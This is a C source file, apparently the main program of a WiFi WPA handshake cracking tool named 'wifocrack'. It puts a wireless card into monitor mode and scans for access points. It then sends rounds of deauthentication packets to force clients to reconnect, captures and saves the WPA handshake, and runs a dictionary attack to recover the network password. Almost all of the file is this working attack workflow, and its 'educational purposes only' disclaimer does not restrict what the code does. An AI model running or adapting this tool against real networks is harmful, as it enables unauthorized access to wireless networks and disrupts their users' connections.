#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <sys/stat.h>
#include "utils.h"
#include "interface.h"
#include "monitor.h"
#include "capture.h"
#include "parser.h"
#include "handshake.h"
#include "scanner.h"
#include "crypto.h"
#include "cracker.h"

#define VERSION "1.0.0"

// Global state for cleanup
static volatile int running = 1;
static char global_iface_name[IFNAMSIZ] = {0};
static struct capture_handle *global_cap = NULL;

// Cleanup function
static void cleanup(void) {
    log_info("Cleaning up...");

    if (global_cap) {
        capture_close(global_cap);
        global_cap = NULL;
    }

    if (strlen(global_iface_name) > 0) {
        disable_monitor_mode(global_iface_name);
        memset(global_iface_name, 0, sizeof(global_iface_name));
    }
}

// Signal handler
static void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        log_info("Received interrupt, cleaning up...");
        running = 0;
    }
}

// Print banner
static void print_banner(void) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                                                              ║\n");
    printf("║         WiFi WPA Handshake Cracker v%s                   ║\n", VERSION);
    printf("║         Educational Purpose Only                             ║\n");
    printf("║                                                              ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
}

// Print legal disclaimer
static void print_disclaimer(void) {
    printf("┌──────────────────────────────────────────────────────────────┐\n");
    printf("│  LEGAL DISCLAIMER:                                          │\n");
    printf("│  This tool is for educational purposes only.                │\n");
    printf("│  Only use on networks you own or have permission to test.   │\n");
    printf("│  Unauthorized access to computer networks is illegal.       │\n");
    printf("└──────────────────────────────────────────────────────────────┘\n\n");
}

// Print usage
static void print_usage(const char *prog_name) {
    printf("Usage: %s [OPTIONS]\n\n", prog_name);
    printf("WiFi WPA Handshake Cracker - Capture and crack WPA handshakes.\n\n");
    printf("Options:\n");
    printf("  -i, --interface NAME   Specify wireless interface (auto-detect if not provided)\n");
    printf("  -b, --bssid MAC        Target AP MAC address (crack first found if not provided)\n");
    printf("  -w, --wordlist PATH    Path to wordlist file (required for cracking)\n");
    printf("  -c, --channel NUM      Specific channel to scan (1-14, default: all)\n");
    printf("  -d, --deauth           Send deauthentication packets to force handshake\n");
    printf("  -s, --scan-only        Only scan for networks (no handshake capture)\n");
    printf("  -v, --version          Show version information\n");
    printf("  -h, --help             Show this help message\n");
    printf("\nExamples:\n");
    printf("  sudo %s -w /usr/share/wordlists/rockyou.txt\n", prog_name);
    printf("  sudo %s -i wlan0 -w rockyou.txt\n", prog_name);
    printf("  sudo %s -i wlan0 -b AA:BB:CC:DD:EE:FF -w rockyou.txt -d\n", prog_name);
    printf("  sudo %s -i wlan0 -s                          # Scan only\n", prog_name);
}

// Print version
static void print_version(void) {
    printf("wifocrack version %s\n", VERSION);
    printf("Built with OpenSSL for educational purposes.\n");
}

// Validate BSSID format
static int validate_bssid(const char *bssid) {
    if (strlen(bssid) != 17) return 0;

    for (int i = 0; i < 17; i++) {
        if (i % 3 == 2) {
            if (bssid[i] != ':') return 0;
        } else {
            if (!((bssid[i] >= '0' && bssid[i] <= '9') ||
                  (bssid[i] >= 'A' && bssid[i] <= 'F') ||
                  (bssid[i] >= 'a' && bssid[i] <= 'f'))) {
                return 0;
            }
        }
    }
    return 1;
}

// Validate wordlist file
static int validate_wordlist(const char *path) {
    struct stat st;

    if (stat(path, &st) < 0) {
        log_error("Wordlist file not found: %s", path);
        return -1;
    }

    if (!S_ISREG(st.st_mode)) {
        log_error("Wordlist is not a regular file: %s", path);
        return -1;
    }

    if (st.st_size == 0) {
        log_error("Wordlist file is empty: %s", path);
        return -1;
    }

    // Check if readable
    if (access(path, R_OK) < 0) {
        log_error("Wordlist file is not readable: %s", path);
        return -1;
    }

    return 0;
}

// Parse command line arguments
struct options {
    char interface[IFNAMSIZ];
    char bssid[18];
    char wordlist[256];
    int  channel;
    int  auto_detect;
    int  scan_only;
    int  deauth;
};

static int parse_args(int argc, char *argv[], struct options *opts) {
    int opt;

    // Default values
    memset(opts, 0, sizeof(*opts));
    opts->auto_detect = 1;
    opts->channel = 0;
    opts->scan_only = 0;
    opts->deauth = 0;

    static struct option long_options[] = {
        {"interface", required_argument, 0, 'i'},
        {"bssid",     required_argument, 0, 'b'},
        {"wordlist",  required_argument, 0, 'w'},
        {"channel",   required_argument, 0, 'c'},
        {"deauth",    no_argument,       0, 'd'},
        {"scan-only", no_argument,       0, 's'},
        {"version",   no_argument,       0, 'v'},
        {"help",      no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    while ((opt = getopt_long(argc, argv, "i:b:w:c:dsvh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'i':
                strncpy(opts->interface, optarg, IFNAMSIZ - 1);
                opts->auto_detect = 0;
                break;
            case 'b':
                if (!validate_bssid(optarg)) {
                    log_error("Invalid BSSID format: %s (expected XX:XX:XX:XX:XX:XX)", optarg);
                    return -1;
                }
                strncpy(opts->bssid, optarg, 17);
                opts->bssid[17] = '\0';
                break;
            case 'w':
                strncpy(opts->wordlist, optarg, 255);
                opts->wordlist[255] = '\0';
                break;
            case 'c':
                opts->channel = atoi(optarg);
                if (opts->channel < 1 || opts->channel > 14) {
                    log_error("Invalid channel: %s (must be 1-14)", optarg);
                    return -1;
                }
                break;
            case 'd':
                opts->deauth = 1;
                break;
            case 's':
                opts->scan_only = 1;
                break;
            case 'v':
                print_version();
                exit(EXIT_SUCCESS);
            case 'h':
                print_usage(argv[0]);
                exit(EXIT_SUCCESS);
            default:
                return -1;
        }
    }

    // Validate required options (only in crack mode)
    if (!opts->scan_only && strlen(opts->wordlist) == 0) {
        log_error("Wordlist is required for cracking (-w/--wordlist)");
        log_info("Use -s/--scan-only for scanning without cracking");
        return -1;
    }

    // Validate wordlist if provided
    if (strlen(opts->wordlist) > 0) {
        if (validate_wordlist(opts->wordlist) < 0) {
            return -1;
        }
    }

    return 0;
}

int main(int argc, char *argv[]) {
    struct options opts;
    struct interface_info iface_list[MAX_INTERFACES];
    struct capture_handle cap;
    struct wpa_handshake handshake;
    struct scanner_state scanner;
    int iface_count, selected_iface;
    int result = EXIT_FAILURE;

    // Set up signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    // Register cleanup function
    atexit(cleanup);

    // Print banner and disclaimer
    print_banner();
    print_disclaimer();

    // Check root
    if (!is_root()) {
        log_error("This program requires root privileges");
        log_info("Run with: sudo %s", argv[0]);
        return EXIT_FAILURE;
    }

    // Parse arguments
    if (parse_args(argc, argv, &opts) < 0) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    // Auto-detect interface if not specified
    if (opts.auto_detect) {
        log_info("Auto-detecting wireless interfaces...");
        iface_count = detect_interfaces(iface_list, MAX_INTERFACES);

        if (iface_count < 0) {
            log_error("Failed to detect interfaces");
            return EXIT_FAILURE;
        }

        if (iface_count == 0) {
            log_error("No wireless interfaces found!");
            log_info("Make sure you have a WiFi adapter connected");
            return EXIT_FAILURE;
        }

        print_interfaces(iface_list, iface_count);

        // Select first interface
        selected_iface = 0;
        log_info("Using interface: %s", iface_list[selected_iface].name);
    } else {
        // Find specified interface
        iface_count = detect_interfaces(iface_list, MAX_INTERFACES);
        selected_iface = select_interface(iface_list, iface_count, opts.interface);

        if (selected_iface < 0) {
            log_error("Interface '%s' not found or not wireless", opts.interface);
            return EXIT_FAILURE;
        }
    }

    // Copy interface name to global state
    strncpy(global_iface_name, iface_list[selected_iface].name, IFNAMSIZ - 1);

    // Print target info
    printf("\n");
    log_info("Configuration:");
    log_info("  Interface:  %s", global_iface_name);
    log_info("  Target BSSID: %s", strlen(opts.bssid) > 0 ? opts.bssid : "(any)");
    if (!opts.scan_only) {
        log_info("  Wordlist:   %s", opts.wordlist);
    }
    log_info("  Channel:    %s", opts.channel > 0 ? "specified" : "all (1-14)");
    log_info("  Deauth:     %s", opts.deauth ? "enabled" : "disabled");
    log_info("  Mode:       %s", opts.scan_only ? "Scan only" : "Handshake capture + crack");
    printf("\n");

    // Put interface in monitor mode
    if (enable_monitor_mode(global_iface_name) < 0) {
        log_error("Failed to put interface in monitor mode");
        return EXIT_FAILURE;
    }

    // Initialize capture
    if (capture_init(&cap, global_iface_name) < 0) {
        log_error("Failed to initialize capture");
        return EXIT_FAILURE;
    }
    global_cap = &cap;

    // Set specific channel if requested
    if (opts.channel > 0) {
        if (capture_set_channel(&cap, opts.channel) < 0) {
            log_error("Failed to set channel %d", opts.channel);
            return EXIT_FAILURE;
        }
    }

    // Initialize parser
    parser_init();

    // Initialize handshake structure
    handshake_init(&handshake);

    // Set target BSSID if specified
    uint8_t target_bssid[6] = {0};
    if (strlen(opts.bssid) > 0) {
        if (str_to_mac(opts.bssid, target_bssid) < 0) {
            log_error("Invalid BSSID format: %s", opts.bssid);
            return EXIT_FAILURE;
        }
    }

    // Initialize scanner
    scanner_init(&scanner, &cap, &handshake, &running);
    if (strlen(opts.bssid) > 0) {
        memcpy(scanner.target_bssid, target_bssid, 6);
        scanner.has_target = 1;
    }

    // Phase 1: Scan for networks
    log_info("Phase 1: Scanning for WiFi networks...");
    printf("\n");

    int dwell_time = 250;
    int scan_duration = 10; // 10 seconds scan
    int ap_count = scanner_scan_duration(&scanner, dwell_time, scan_duration);

    printf("\n");

    if (ap_count == 0) {
        log_warning("No access points found");
        log_info("Tips:");
        log_info("  - Make sure your adapter supports monitor mode");
        log_info("  - Try moving closer to access points");
        log_info("  - Check if the interface is working properly");
        goto cleanup;
    }

    log_info("Found %d access points", ap_count);

    // Phase 2: Let user select target (if not already specified)
    if (!scanner.has_target) {
        printf("\n");
        log_info("Phase 2: Select target network");

        int target_idx = scanner_select_target(&scanner);
        if (target_idx < 0) {
            log_warning("No target selected");
            goto cleanup;
        }

        // Set channel to target network's channel
        int target_channel = scanner.aps[target_idx].channel;
        log_info("Switching to channel %d for target...", target_channel);
        if (capture_set_channel(&cap, target_channel) < 0) {
            log_error("Failed to set channel %d", target_channel);
            goto cleanup;
        }
    } else {
        // BSSID was specified, find its channel
        struct ap_info *target = scanner_find_ap(&scanner, target_bssid);
        if (target && target->channel > 0) {
            log_info("Target found on channel %d", target->channel);
            capture_set_channel(&cap, target->channel);
        }
    }

    // Phase 3: Capture handshake on target
    printf("\n");
    log_info("Phase 3: Capturing handshake on target...");

    // Send deauth packets if enabled
    if (opts.deauth) {
        log_info("Sending deauthentication packets to force handshake...");

        // Send 3 rounds of deauth with waits in between
        for (int round = 0; round < 3; round++) {
            if (!running) break;

            log_info("  Deauth round %d/3...", round + 1);
            int sent = scanner_send_deauth(&cap, scanner.target_bssid, NULL, 30);
            log_info("  Sent %d deauth packets", sent);

            // Wait for reconnection
            if (round < 2) {
                log_info("  Waiting for reconnection...");
                time_t wait_start = time(NULL);
                while (running && (time(NULL) - wait_start) < 3) {
                    uint8_t buf[MAX_PACKET_SIZE];
                    int len = capture_packet(&cap, buf, sizeof(buf), 500);
                    if (len > 0) {
                        scanner_packet_callback(buf, len, &scanner);
                        if (handshake_is_complete(&handshake)) break;
                    }
                }
                if (handshake_is_complete(&handshake)) break;
            }
        }
    }

    log_info("Listening for handshake... (Press Ctrl+C to stop)");

    time_t capture_start = time(NULL);
    int handshake_timeout = 60; // 60 seconds to capture handshake
    uint8_t buffer[MAX_PACKET_SIZE];

    while (running && !handshake_is_complete(&handshake)) {
        if ((time(NULL) - capture_start) > handshake_timeout) {
            log_warning("Handshake capture timed out after %d seconds", handshake_timeout);
            break;
        }

        int packet_len = capture_packet(&cap, buffer, sizeof(buffer), 500);
        if (packet_len > 0) {
            scanner_packet_callback(buffer, packet_len, &scanner);
        }

        // Print status every 10 seconds
        if ((time(NULL) - capture_start) % 10 == 0) {
            handshake_print_status(&handshake);
        }
    }

    printf("\n");

    // Check results
    if (handshake_is_complete(&handshake)) {
        log_success("WPA handshake captured!");

        // Save handshake
        char handshake_file[256];
        snprintf(handshake_file, sizeof(handshake_file), "handshake_%s.cap",
                 global_iface_name);

        if (handshake_save(&handshake, handshake_file) == 0) {
            log_info("Handshake saved to: %s", handshake_file);
        }

        handshake_print_status(&handshake);

        // Phase 4: Dictionary attack
        if (!opts.scan_only && strlen(opts.wordlist) > 0) {
            printf("\n");
            log_info("Phase 4: Starting dictionary attack...");

            struct cracker_config cracker_cfg;
            struct cracker_stats cracker_stats;

            cracker_config_init(&cracker_cfg);
            cracker_config_set_wordlist(&cracker_cfg, opts.wordlist);
            if (strlen(handshake.ssid) > 0) {
                cracker_config_set_ssid(&cracker_cfg, handshake.ssid);
            }

            int crack_result = cracker_attack(&handshake, &cracker_cfg, &cracker_stats);
            cracker_print_stats(&cracker_stats);

            if (crack_result == 0) {
                log_success("Password cracked successfully!");
                result = EXIT_SUCCESS;
            } else if (crack_result == 1) {
                log_warning("Password not found in wordlist");
                log_info("Try a larger wordlist or check if the password is complex");
                result = EXIT_SUCCESS;
            } else {
                log_error("Dictionary attack failed");
            }
        }
    } else {
        log_warning("Handshake capture incomplete");
        handshake_print_status(&handshake);
        log_info("Tips:");
        log_info("  - Wait for devices to connect/reconnect to the network");
        log_info("  - Try running the tool again");
    }

cleanup:
    // Cleanup handled by atexit(cleanup)
    log_info("Done.");
    return (result == EXIT_SUCCESS) ? EXIT_SUCCESS : EXIT_FAILURE;
}
